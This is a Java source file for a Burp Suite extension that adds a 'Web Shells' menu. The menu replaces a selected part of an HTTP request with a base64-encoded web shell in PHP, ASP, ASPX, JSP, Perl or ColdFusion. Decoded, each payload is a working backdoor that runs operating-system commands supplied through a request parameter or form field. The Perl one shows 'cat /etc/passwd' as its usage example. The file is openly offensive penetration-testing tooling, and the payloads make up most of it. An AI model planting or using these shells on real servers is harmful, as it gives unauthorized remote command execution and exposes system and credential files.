
package burp;

import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import javax.swing.JMenu;

/**
 *
 * @author errorfiathck
 */
public class WebShell_Menu extends JMenu {
    public BurpExtender myburp;
    public String[] WebShell_MenuItems = {"php", "asp", "aspx","jsp", "perl", "cfm"};
    
    WebShell_Menu(BurpExtender burp){
        this.setText("Web Shells");
        this.myburp = burp;
        Methods.add_MenuItem_and_listener(this, WebShell_MenuItems, new WebShellItemListener(myburp));
    }
}


class WebShellItemListener implements ActionListener {

    BurpExtender myburp;
    WebShellItemListener(BurpExtender burp) {
        myburp = burp;
    }
    
    @Override
    public void actionPerformed(ActionEvent e) {
        int[] selectedIndex = myburp.context.getSelectionBounds();
        IHttpRequestResponse req = myburp.context.getSelectedMessages()[0];
        byte[] request = req.getRequest();
        byte[] param = new byte[selectedIndex[1]-selectedIndex[0]];
        System.arraycopy(request, selectedIndex[0], param, 0, selectedIndex[1]-selectedIndex[0]);
        String selectString = new String(param);
        String action = e.getActionCommand();
        byte[] newRequest = do_WebShell(request, selectString, action, selectedIndex);
        req.setRequest(newRequest);
    }
    
    public byte[] do_WebShell(byte[] request, String selectedString, String action, int[] selectedIndex){
        switch(action){
            case "php":
                selectedString =  new String(myburp.helpers.base64Decode("PD9waHAKCWlmKGlzc2V0KCRfUkVRVUVTVFsnY21kJ10pKXsKCSAgICAgICAgZWNobyAiPHByZT4iOwoJICAgICAgICAkY21kID0gKCRfUkVRVUVTVFsnY21kJ10pOwoJICAgICAgICBzeXN0ZW0oJGNtZCk7CgkgICAgICAgIGVjaG8gIjwvcHJlPiI7CgkgICAgICAgIGRpZTsKCX0KPz4K")); 
                break;
            case "asp":
                selectedString = new String(myburp.helpers.base64Decode("PCUKRGltIG9TLG9TTmV0LG9GU3lzLCBvRixzekNNRCwgc3pURgpPbiBFcnJvciBSZXN1bWUgTmV4dApTZXQgb1MgPSBTZXJ2ZXIuQ3JlYXRlT2JqZWN0KCJXU0NSSVBULlNIRUxMIikKU2V0IG9TTmV0ID0gU2VydmVyLkNyZWF0ZU9iamVjdCgiV1NDUklQVC5ORVRXT1JLIikKU2V0IG9GU3lzID0gU2VydmVyLkNyZWF0ZU9iamVjdCgiU2NyaXB0aW5nLkZpbGVTeXN0ZW1PYmplY3QiKQpzekNNRCA9IFJlcXVlc3QuRm9ybSgiQyIpCklmIChzekNNRCA8PiAiIikgVGhlbgogIHN6VEYgPSAiYzpcd2luZG93c1xwY2hlYWx0aFxFUlJPUlJFUFxRSEVBRExFU1wiICYgIG9GU3lzLkdldFRlbXBOYW1lKCkKICAnIEhlcmUgd2UgZG8gdGhlIGNvbW1hbmQKICBDYWxsIG9TLlJ1bigid2luLmNvbSBjbWQuZXhlIC9jICIiIiAmIHN6Q01EICYgIiA+ICIgJiBzelRGICYKIiIiIiwwLFRydWUpCiAgcmVzcG9uc2Uud3JpdGUgc3pURgogICcgQ2hhbmdlIHBlcm1zCiAgQ2FsbCBvUy5SdW4oIndpbi5jb20gY21kLmV4ZSAvYyBjYWNscy5leGUgIiAmIHN6VEYgJiAiIC9FIC9HCmV2ZXJ5b25lOkYiLDAsVHJ1ZSkKICBTZXQgb0YgPSBvRlN5cy5PcGVuVGV4dEZpbGUoc3pURiwxLEZhbHNlLDApCkVuZCBJZiAKJT4KPEZPUk0gYWN0aW9uPSI8JT0gUmVxdWVzdC5TZXJ2ZXJWYXJpYWJsZXMoIlVSTCIpICU+IiBtZXRob2Q9IlBPU1QiPgo8aW5wdXQgdHlwZT10ZXh0IG5hbWU9IkMiIHNpemU9NzAgdmFsdWU9IjwlPSBzekNNRCAlPiI+CjxpbnB1dCB0eXBlPXN1Ym1pdCB2YWx1ZT0iUnVuIj48L0ZPUk0+PFBSRT4KTWFjaGluZTogPCU9b1NOZXQuQ29tcHV0ZXJOYW1lJT48QlI+ClVzZXJuYW1lOiA8JT1vU05ldC5Vc2VyTmFtZSU+PGJyPgo8JSAKSWYgKElzT2JqZWN0KG9GKSkgVGhlbgogIE9uIEVycm9yIFJlc3VtZSBOZXh0CiAgUmVzcG9uc2UuV3JpdGUgU2VydmVyLkhUTUxFbmNvZGUob0YuUmVhZEFsbCkKICBvRi5DbG9zZQogIENhbGwgb1MuUnVuKCJ3aW4uY29tIGNtZC5leGUgL2MgZGVsICImIHN6VEYsMCxUcnVlKQpFbmQgSWYgCiU+Cg=="));
                break;
            case "aspx":
                selectedString = new String(myburp.helpers.base64Decode("PCVAIFBhZ2UgTGFuZ3VhZ2U9IkMjIiBEZWJ1Zz0idHJ1ZSIgVHJhY2U9ImZhbHNlIiAlPgo8JUAgSW1wb3J0IE5hbWVzcGFjZT0iU3lzdGVtLkRpYWdub3N0aWNzIiAlPgo8JUAgSW1wb3J0IE5hbWVzcGFjZT0iU3lzdGVtLklPIiAlPgo8c2NyaXB0IExhbmd1YWdlPSJjIyIgcnVuYXQ9InNlcnZlciI+CnZvaWQgUGFnZV9Mb2FkKG9iamVjdCBzZW5kZXIsIEV2ZW50QXJncyBlKQp7Cn0Kc3RyaW5nIEV4Y3V0ZUNtZChzdHJpbmcgYXJnKQp7ClByb2Nlc3NTdGFydEluZm8gcHNpID0gbmV3IFByb2Nlc3NTdGFydEluZm8oKTsKcHNpLkZpbGVOYW1lID0gImNtZC5leGUiOwpwc2kuQXJndW1lbnRzID0gIi9jICIrYXJnOwpwc2kuUmVkaXJlY3RTdGFuZGFyZE91dHB1dCA9IHRydWU7CnBzaS5Vc2VTaGVsbEV4ZWN1dGUgPSBmYWxzZTsKUHJvY2VzcyBwID0gUHJvY2Vzcy5TdGFydChwc2kpOwpTdHJlYW1SZWFkZXIgc3RtcmRyID0gcC5TdGFuZGFyZE91dHB1dDsKc3RyaW5nIHMgPSBzdG1yZHIuUmVhZFRvRW5kKCk7CnN0bXJkci5DbG9zZSgpOwpyZXR1cm4gczsKfQp2b2lkIGNtZEV4ZV9DbGljayhvYmplY3Qgc2VuZGVyLCBTeXN0ZW0uRXZlbnRBcmdzIGUpCnsKUmVzcG9uc2UuV3JpdGUoIjxwcmU+Iik7ClJlc3BvbnNlLldyaXRlKFNlcnZlci5IdG1sRW5jb2RlKEV4Y3V0ZUNtZCh0eHRBcmcuVGV4dCkpKTsKUmVzcG9uc2UuV3JpdGUoIjwvcHJlPiIpOwp9Cjwvc2NyaXB0Pgo8SFRNTD4KPEhFQUQ+Cjx0aXRsZT5hd2VuIGFzcC5uZXQgd2Vic2hlbGw8L3RpdGxlPgo8L0hFQUQ+Cjxib2R5ID4KPGZvcm0gaWQ9ImNtZCIgbWV0aG9kPSJwb3N0IiBydW5hdD0ic2VydmVyIj4KPGFzcDpUZXh0Qm94IGlkPSJ0eHRBcmciIHN0eWxlPSJaLUlOREVYOiAxMDE7IExFRlQ6IDQwNXB4OyBQT1NJVElPTjogYWJzb2x1dGU7IFRPUDogMjBweCIgcnVuYXQ9InNlcnZlciIgV2lkdGg9IjI1MHB4Ij48L2FzcDpUZXh0Qm94Pgo8YXNwOkJ1dHRvbiBpZD0idGVzdGluZyIgc3R5bGU9IlotSU5ERVg6IDEwMjsgTEVGVDogNjc1cHg7IFBPU0lUSU9OOiBhYnNvbHV0ZTsgVE9QOiAxOHB4IiBydW5hdD0ic2VydmVyIiBUZXh0PSJleGN1dGUiIE9uQ2xpY2s9ImNtZEV4ZV9DbGljayI+PC9hc3A6QnV0dG9uPgo8YXNwOkxhYmVsIGlkPSJsYmxUZXh0IiBzdHlsZT0iWi1JTkRFWDogMTAzOyBMRUZUOiAzMTBweDsgUE9TSVRJT046IGFic29sdXRlOyBUT1A6IDIycHgiIHJ1bmF0PSJzZXJ2ZXIiPkNvbW1hbmQ6PC9hc3A6TGFiZWw+CjwvZm9ybT4KPC9ib2R5Pgo8L0hUTUw+Cg=="));
                break;
            case "jsp":
                selectedString = new String(myburp.helpers.base64Decode("PEZPUk0gTUVUSE9EPUdFVCBBQ1RJT049J2NtZGpzcC5qc3AnPgo8SU5QVVQgbmFtZT0nY21kJyB0eXBlPXRleHQ+CjxJTlBVVCB0eXBlPXN1Ym1pdCB2YWx1ZT0nUnVuJz4KPC9GT1JNPgo8JUAgcGFnZSBpbXBvcnQ9ImphdmEuaW8uKiIgJT4KPCUKICAgU3RyaW5nIGNtZCA9IHJlcXVlc3QuZ2V0UGFyYW1ldGVyKCJjbWQiKTsKICAgU3RyaW5nIG91dHB1dCA9ICIiOwoKICAgaWYoY21kICE9IG51bGwpIHsKICAgICAgU3RyaW5nIHMgPSBudWxsOwogICAgICB0cnkgewogICAgICAgICBQcm9jZXNzIHAgPSBSdW50aW1lLmdldFJ1bnRpbWUoKS5leGVjKCJjbWQuZXhlIC9DICIgKyBjbWQpOwogICAgICAgICBCdWZmZXJlZFJlYWRlciBzSSA9IG5ldyBCdWZmZXJlZFJlYWRlcihuZXcgSW5wdXRTdHJlYW1SZWFkZXIocC5nZXRJbnB1dFN0cmVhbSgpKSk7CiAgICAgICAgIHdoaWxlKChzID0gc0kucmVhZExpbmUoKSkgIT0gbnVsbCkgewogICAgICAgICAgICBvdXRwdXQgKz0gczsKICAgICAgICAgfQogICAgICB9CiAgICAgIGNhdGNoKElPRXhjZXB0aW9uIGUpIHsKICAgICAgICAgZS5wcmludFN0YWNrVHJhY2UoKTsKICAgICAgfQogICB9CiU+Cgo8cHJlPgo8JT1vdXRwdXQgJT4KPC9wcmU+Cg=="));
                break;
            case "perl":
                selectedString = new String(myburp.helpers.base64Decode("IyEvdXNyL2Jpbi9wZXJsIC13Cgp1c2Ugc3RyaWN0OwoKcHJpbnQgIkNhY2hlLUNvbnRyb2w6IG5vLWNhY2hlXG4iOwpwcmludCAiQ29udGVudC10eXBlOiB0ZXh0L2h0bWxcblxuIjsKCm15ICRyZXEgPSAkRU5We1FVRVJZX1NUUklOR307CiAgIGNob21wICgkcmVxKTsKICAgJHJlcSA9fiBzLyUyMC8gL2c7IAogICAkcmVxID1+IHMvJTNiLzsvZzsKCnByaW50ICI8aHRtbD48Ym9keT4iOwoKcHJpbnQgJzwhLS0gU2ltcGxlIENHSSBiYWNrZG9vciBieSBESyAoaHR0cDovL21pY2hhZWxkYXcub3JnKSAtLT4nOwoKICAgaWYgKCEkcmVxKSB7CiAgICAgIHByaW50ICJVc2FnZTogaHR0cDovL3RhcmdldC5jb20vcGVybGNtZC5jZ2k/Y2F0IC9ldGMvcGFzc3dkIjsKICAgfQogICBlbHNlIHsKICAgICAgcHJpbnQgIkV4ZWN1dGluZzogJHJlcSI7CiAgIH0KCiAgIHByaW50ICI8cHJlPiI7CiAgIG15IEBjbWQgPSBgJHJlcWA7CiAgIHByaW50ICI8L3ByZT4iOwoKICAgZm9yZWFjaCBteSAkbGluZSAoQGNtZCkgewogICAgICBwcmludCAkbGluZSAuICI8YnIvPiI7CiAgIH0KCnByaW50ICI8L2JvZHk+PC9odG1sPiI7Cg=="));
                break;
            case "cfm":
                selectedString = new String(myburp.helpers.base64Decode("PGh0bWw+Cjxib2R5PgoKPCEtLSBDb250cmlidXRlZCBieSBLdXJ0IEdydXR6bWFjaGVyICgpIC0tPgoKTm90ZXM6PGJyPjxicj4KPHVsPgo8bGk+UHJlZml4IERPUyBjb21tYW5kcyB3aXRoICJjOlx3aW5kb3dzXHN5c3RlbTMyXGNtZC5leGUgL2MgJmx0O2NvbW1hbmQmZ3Q7IiBvciB3aGVyZXZlciBjbWQuZXhlIGlzPGJyPgo8bGk+T3B0aW9ucyBhcmUsIG9mIGNvdXJzZSwgdGhlIGNvbW1hbmQgbGluZSBvcHRpb25zIHlvdSB3YW50IHRvIHJ1bgo8bGk+Q0ZFWEVDVVRFIGNvdWxkIGJlIHJlbW92ZWQgYnkgdGhlIGFkbWluLiBJZiB5b3UgaGF2ZSBhY2Nlc3MgdG8gQ0ZJREUvYWRtaW5pc3RyYXRvciB5b3UgY2FuIHJlLWVuYWJsZSBpdAo8L3VsPgo8cD4KPGNmb3V0cHV0Pgo8dGFibGU+Cjxmb3JtIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSJjZmV4ZWMuY2ZtIj4KPHRyPjx0ZD5Db21tYW5kOjwvdGQ+PHRkPjxpbnB1dCB0eXBlPXRleHQgbmFtZT0iY21kIiBzaXplPTUwIAogIDxjZmlmIGlzZGVmaW5lZCgiZm9ybS5jbWQiKT52YWx1ZT0iI2Zvcm0uY21kIyI8L2NmaWY+Pjxicj48L3RkPjwvdHI+Cjx0cj48dGQ+T3B0aW9uczo8L3RkPjx0ZD4gPGlucHV0IHR5cGU9dGV4dCBuYW1lPSJvcHRzIiBzaXplPTUwIAogIDxjZmlmIGlzZGVmaW5lZCgiZm9ybS5vcHRzIik+dmFsdWU9IiNmb3JtLm9wdHMjIjwvY2ZpZj4+PGJyPjwvdGQ+PC90cj4KPHRyPjx0ZD5UaW1lb3V0OjwvdGQ+PHRkPiA8aW5wdXQgdHlwZT10ZXh0IG5hbWU9InRpbWVvdXQiIHNpemU9NCAKICA8Y2ZpZiBpc2RlZmluZWQoImZvcm0udGltZW91dCIpPnZhbHVlPSIjZm9ybS50aW1lb3V0IyIKICA8Y2ZlbHNlPnZhbHVlPSI1IjwvY2ZpZj4+PC90ZD48L3RyPgo8L3RhYmxlPgo8aW5wdXQgdHlwZT1zdWJtaXQgdmFsdWU9IkV4ZWMiID4KPC9GT1JNPgoKPGNmaWYgaXNkZWZpbmVkKCJmb3JtLmNtZCIpPgo8Y2ZzYXZlY29udGVudCB2YXJpYWJsZT0ibXlWYXIiPgo8Y2ZleGVjdXRlIG5hbWUgPSAiI0Zvcm0uY21kIyIKICAgYXJndW1lbnRzID0gIiNGb3JtLm9wdHMjIiAKICAgdGltZW91dCA9ICIjRm9ybS50aW1lb3V0IyI+CjwvY2ZleGVjdXRlPgo8L2Nmc2F2ZWNvbnRlbnQ+CjxwcmU+CiNteVZhciMKPC9wcmU+CjwvY2ZpZj4KPC9jZm91dHB1dD4KPC9ib2R5Pgo8L2h0bWw+Cgo8IS0tIENvbnRyaWJ1dGVkIGJ5IEt1cnQgR3J1dHptYWNoZXIgKGh0dHA6Ly9ncnV0ei5qaW5nb2phbmdvLm5ldC9leHBsb2l0cy8pIC0tPgo8IS0tICAgIGh0dHA6Ly9taWNoYWVsZGF3Lm9yZyAgIDA0LzIwMDcgICAgLS0+CjxodG1sPgo8Ym9keT4KCjwhLS0gQ29udHJpYnV0ZWQgYnkgS3VydCBHcnV0em1hY2hlciAoKSAtLT4KCk5vdGVzOjxicj48YnI+Cjx1bD4KPGxpPlByZWZpeCBET1MgY29tbWFuZHMgd2l0aCAiYzpcd2luZG93c1xzeXN0ZW0zMlxjbWQuZXhlIC9jICZsdDtjb21tYW5kJmd0OyIgb3Igd2hlcmV2ZXIgY21kLmV4ZSBpczxicj4KPGxpPk9wdGlvbnMgYXJlLCBvZiBjb3Vyc2UsIHRoZSBjb21tYW5kIGxpbmUgb3B0aW9ucyB5b3Ugd2FudCB0byBydW4KPGxpPkNGRVhFQ1VURSBjb3VsZCBiZSByZW1vdmVkIGJ5IHRoZSBhZG1pbi4gSWYgeW91IGhhdmUgYWNjZXNzIHRvIENGSURFL2FkbWluaXN0cmF0b3IgeW91IGNhbiByZS1lbmFibGUgaXQKPC91bD4KPHA+CjxjZm91dHB1dD4KPHRhYmxlPgo8Zm9ybSBtZXRob2Q9IlBPU1QiIGFjdGlvbj0iY2ZleGVjLmNmbSI+Cjx0cj48dGQ+Q29tbWFuZDo8L3RkPjx0ZD48aW5wdXQgdHlwZT10ZXh0IG5hbWU9ImNtZCIgc2l6ZT01MCAKICA8Y2ZpZiBpc2RlZmluZWQoImZvcm0uY21kIik+dmFsdWU9IiNmb3JtLmNtZCMiPC9jZmlmPj48YnI+PC90ZD48L3RyPgo8dHI+PHRkPk9wdGlvbnM6PC90ZD48dGQ+IDxpbnB1dCB0eXBlPXRleHQgbmFtZT0ib3B0cyIgc2l6ZT01MCAKICA8Y2ZpZiBpc2RlZmluZWQoImZvcm0ub3B0cyIpPnZhbHVlPSIjZm9ybS5vcHRzIyI8L2NmaWY+Pjxicj48L3RkPjwvdHI+Cjx0cj48dGQ+VGltZW91dDo8L3RkPjx0ZD4gPGlucHV0IHR5cGU9dGV4dCBuYW1lPSJ0aW1lb3V0IiBzaXplPTQgCiAgPGNmaWYgaXNkZWZpbmVkKCJmb3JtLnRpbWVvdXQiKT52YWx1ZT0iI2Zvcm0udGltZW91dCMiCiAgPGNmZWxzZT52YWx1ZT0iNSI8L2NmaWY+PjwvdGQ+PC90cj4KPC90YWJsZT4KPGlucHV0IHR5cGU9c3VibWl0IHZhbHVlPSJFeGVjIiA+CjwvRk9STT4KCjxjZmlmIGlzZGVmaW5lZCgiZm9ybS5jbWQiKT4KPGNmc2F2ZWNvbnRlbnQgdmFyaWFibGU9Im15VmFyIj4KPGNmZXhlY3V0ZSBuYW1lID0gIiNGb3JtLmNtZCMiCiAgIGFyZ3VtZW50cyA9ICIjRm9ybS5vcHRzIyIgCiAgIHRpbWVvdXQgPSAiI0Zvcm0udGltZW91dCMiPgo8L2NmZXhlY3V0ZT4KPC9jZnNhdmVjb250ZW50Pgo8cHJlPgojbXlWYXIjCjwvcHJlPgo8L2NmaWY+CjwvY2ZvdXRwdXQ+CjwvYm9keT4KPC9odG1sPgo="));
                break;
            default:
                break;
        }
        return Methods.do_modify_request(request, selectedIndex, selectedString);
    }
    

}